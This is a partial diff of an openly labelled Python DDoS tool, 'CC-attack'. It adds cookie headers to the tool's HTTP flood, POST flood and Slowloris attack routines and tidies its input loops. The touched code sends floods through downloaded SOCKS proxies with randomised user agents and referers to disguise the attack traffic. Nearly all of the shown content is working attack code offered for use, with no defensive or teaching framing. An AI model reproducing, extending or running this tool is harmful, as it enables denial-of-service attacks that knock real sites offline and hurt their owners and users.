@@ -27,16 +27,16 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 3.2 (Little Improvement)
+Python3 version 3.2 Beta 
                             C0d3d by L330n123
 ┌─────────────────────────────────────────────┐
 │        Tos: Don't attack .gov website       │
 ├─────────────────────────────────────────────┤
 │                 New stuff:                  │
+│          + Customize Cookies                │
 │          + Customize data of post mode      │
 │          + Fast Port Re-use                 │
 │          + Added Random client ip           │
-│          + Added socks mode selection       │
 ├─────────────────────────────────────────────┤
 │ Link: https://github.com/Leeon123/CC-attack │
 └─────────────────────────────────────────────┘''')
@@ -67,6 +67,7 @@ referers = [
 	"https://r.search.yahoo.com/",
 ]
 data = ""
+cookies = ""
 strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
 def getuseragent():
     platform = random.choice(['Macintosh', 'Windows', 'X11'])
@@ -108,6 +109,8 @@ def getuseragent():
         return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
 def cc(socks_type):
 	connection = "Connection: Keep-Alive\r\n"
+	if cookies != "":
+		connection += "Cookies: "+str(cookies)+"\r\n"
 	err = 0
 	if str(port) == "443" :
 		n = "HTTPS"
@@ -157,6 +160,8 @@ def post(socks_type):
 	if mode2 != "y":
 		data = str(random._urandom(16)) # You can enable bring data in HTTP Header
 	length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
+	if cookies != "":
+		length += "Cookies: "+str(cookies)+"\r\n"
 	request = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
 	proxy = random.choice(proxies).strip().split(":")
 	err = 0
@@ -214,7 +219,10 @@ def slow(conn,socks_type):
 			s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
 			s.send("User-Agent: {}\r\n".format(getuseragent).encode("utf-8"))
 			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+			if cookies != "":
+				s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
 			s.send(("Connection:keep-alive").encode("utf-8"))
+			
 			socket_list.append(s)
 			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 			sys.stdout.flush()
@@ -252,6 +260,8 @@ def slow(conn,socks_type):
 				s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
 				s.send("User-Agent: {}\r\n".format(getuseragent).encode("utf-8"))
 				s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+				if cookies != "":
+					s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
 				s.send(("Connection:keep-alive").encode("utf-8"))
 				socket_list.append(s)
 				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
@@ -343,6 +353,7 @@ def check_list(socks_file):
 	for i in list(temp_list):
 		rfile.write(bytes(i,encoding='utf-8'))
 	rfile.close()
+
 def downloadsocks(choice):
 	if choice == "4":
 		f = open("socks4.txt",'wb')
@@ -393,6 +404,7 @@ def downloadsocks(choice):
 		except:
 			f.close()
 		print("> Have already downloaded socks5 list as socks5.txt")
+
 def main():
 	global ip
 	global url2
@@ -402,15 +414,19 @@ def main():
 	global choice
 	global data
 	global mode2
+	global cookies
 	ip = ""
 	port = ""
+	mode = ""
 	print("> Mode: [cc/post/slow/check]")
-	mode = str(input("> Choose Your Mode (default=cc) :")).strip()
-	if mode == "":
-		mode = "cc"
-	elif(mode != "cc") and (mode != "post")and(mode != "slow" )and(mode !="check"):
-		print("> Plese enter correct mode")
-		sys.exit(1)
+	while mode == "" :
+		mode = str(input("> Choose Your Mode (default=cc) :")).strip()
+		if mode == "":
+			mode = "cc"
+		elif(mode != "cc") and (mode != "post")and(mode != "slow" )and(mode !="check"):
+			print("> Plese enter correct mode")
+			mode = ""
+			continue
 	ip = str(input("> Host/Ip:"))
 	if ip == "":
 		print("> Plese enter correct host or ip")
@@ -435,7 +451,10 @@ def main():
 		mode2 = str(input("> Customize post data? (y/n, default=n):")).strip()
 		if mode2 == "y":
 			data = open(input("> Input the file's path:").strip()).readlines()
-			data = ' '.join([str(txt) for txt in data]) 
+			data = ' '.join([str(txt) for txt in data])
+	choice2 = str(input("Customize cookies? (y/n, default=n):")).strip()
+	if choice2 == "y":
+		cookies = str(input("Plese input the cookies:")).strip()
 	choice = ""
 	while choice == "":
 		choice = str(input("> Choose your socks mode(4/5, default=5):")).strip()
@@ -443,6 +462,7 @@ def main():
 			choice = "5"
 		if choice != "4" and choice != "5":
 			print("> [!] Error Choice try again")
+			choice = ""
 		if choice == "4":
 			socks_type = 4
 		else:
